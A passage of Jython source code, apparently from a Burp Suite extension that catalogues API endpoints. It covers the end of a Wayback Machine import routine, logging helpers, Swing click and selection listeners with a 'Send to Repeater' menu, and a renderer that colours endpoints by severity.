                    "Error importing Wayback URL: {}".format(str(e))
                )

        summary = "\n" + "=" * 60 + "\n"
        summary += "IMPORT COMPLETE\n"
        summary += "=" * 60 + "\n"
        summary += "[+] New Endpoints: {}\n".format(imported)
        summary += "[+] Skipped (duplicates): {}\n".format(skipped)
        summary += "[+] Total Processed: {}\n".format(len(snapshots))
        summary += "=" * 60 + "\n"

        self.wayback_area.append(summary)
        self.log_to_ui("[+] Wayback: {} new, {} skipped".format(imported, skipped))
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def log_to_ui(self, message):
        timestamp = SimpleDateFormat("HH:mm:ss").format(Date())
        timestamped = "[{}] {}".format(timestamp, message)
        self._callbacks.printOutput(timestamped)
        SwingUtilities.invokeLater(lambda: self._append_log(timestamped))

    def _append_log(self, message):
        self.log_area.append(message + "\n")
        self.log_area.setCaretPosition(self.log_area.getDocument().getLength())


class EndpointClickListener(MouseAdapter):
    def __init__(self, extender):
        self.extender = extender

    @staticmethod
    def _extract_endpoint_key(value):
        if "x]" in value and not value.startswith("==="):
            parts = value.split("] ", 1)
            if len(parts) > 1:
                return parts[1].split(" @ ")[0]
        return None

    def mouseClicked(self, event):
        if event.getClickCount() == 2:
            list = event.getSource()
            index = list.locationToIndex(event.getPoint())
            if index >= 0:
                value = str(list.getModel().getElementAt(index))
                endpoint_key = self._extract_endpoint_key(value)
                if endpoint_key:
                    self.extender.show_endpoint_details(endpoint_key)

    def mousePressed(self, event):
        self._show_popup(event)

    def mouseReleased(self, event):
        self._show_popup(event)

    def _show_popup(self, event):
        if event.isPopupTrigger():
            list = event.getSource()
            index = list.locationToIndex(event.getPoint())
            if index >= 0:
                list.setSelectedIndex(index)
                value = str(list.getModel().getElementAt(index))
                endpoint_key = self._extract_endpoint_key(value)
                if endpoint_key:
                    popup = JPopupMenu()
                    repeater_item = JMenuItem("Send to Repeater")
                    repeater_item.addActionListener(
                        lambda e: self.extender._send_endpoint_to_repeater(endpoint_key)
                    )
                    popup.add(repeater_item)
                    popup.show(event.getComponent(), event.getX(), event.getY())


class EndpointSelectionListener(ListSelectionListener):
    def __init__(self, extender):
        self.extender = extender

    def valueChanged(self, event):
        if not event.getValueIsAdjusting():
            list = event.getSource()
            index = list.getSelectedIndex()
            if index >= 0:
                value = str(list.getModel().getElementAt(index))
                endpoint_key = EndpointClickListener._extract_endpoint_key(value)
                if endpoint_key:
                    self.extender.show_endpoint_details(endpoint_key)


class EndpointRenderer(ListCellRenderer):
    def __init__(self, extender):
        self.extender = extender
        self.severity_cache = {}

    def invalidate_cache(self):
        self.severity_cache.clear()

    def getListCellRendererComponent(
        self, list, value, index, isSelected, cellHasFocus
    ):
        panel = JPanel()
        panel.setLayout(BoxLayout(panel, BoxLayout.X_AXIS))
        panel.setOpaque(True)

        text_label = JLabel(str(value))
        text_label.setFont(Font("Monospaced", Font.PLAIN, 12))
        panel.add(text_label)
        panel.add(Box.createHorizontalGlue())

        # Extract endpoint key from display text
        endpoint_key = EndpointClickListener._extract_endpoint_key(str(value))

        # Determine severity using cache to avoid lock on every render
        severity = None
        if endpoint_key:
            severity = self.severity_cache.get(endpoint_key)
            if severity is None:
                with self.extender.lock:
                    if endpoint_key in self.extender.api_data:
                        entries = self.extender.api_data[endpoint_key]
                        severity = self.extender._get_severity(endpoint_key, entries)
                        self.severity_cache[endpoint_key] = severity

        if severity:

            severity_label = JLabel()
            severity_label.setFont(Font("Monospaced", Font.BOLD, 11))

            if severity == "critical":
                panel.setBackground(
                    Color(220, 53, 69) if not isSelected else Color(180, 43, 59)
                )
                text_label.setForeground(Color.WHITE)
                severity_label.setText("[CRITICAL]")
                severity_label.setForeground(Color.WHITE)
            elif severity == "high":
                panel.setBackground(
                    Color(255, 193, 7) if not isSelected else Color(215, 163, 0)
                )
                text_label.setForeground(Color.BLACK)
                severity_label.setText("[HIGH]")
                severity_label.setForeground(Color(139, 0, 0))
            elif severity == "medium":
                panel.setBackground(
                    Color(255, 235, 170) if not isSelected else Color(215, 195, 130)
                )
                text_label.setForeground(Color.BLACK)
                severity_label.setText("[MEDIUM]")
                severity_label.setForeground(Color(139, 69, 0))
            else:
                if isSelected:
                    panel.setBackground(Color(220, 220, 220))
                elif index % 2 == 0:
                    panel.setBackground(Color.WHITE)
                else:
                    panel.setBackground(Color(245, 245, 245))
                text_label.setForeground(Color.BLACK)

            if severity in ["critical", "high", "medium"]:
                panel.add(severity_label)
        else:
            # Group headers or non-endpoint lines
            if isSelected:
                panel.setBackground(Color(220, 220, 220))
            elif index % 2 == 0:
                panel.setBackground(Color.WHITE)
            else:
                panel.setBackground(Color(245, 245, 245))
            text_label.setForeground(Color.BLACK)

        return panel
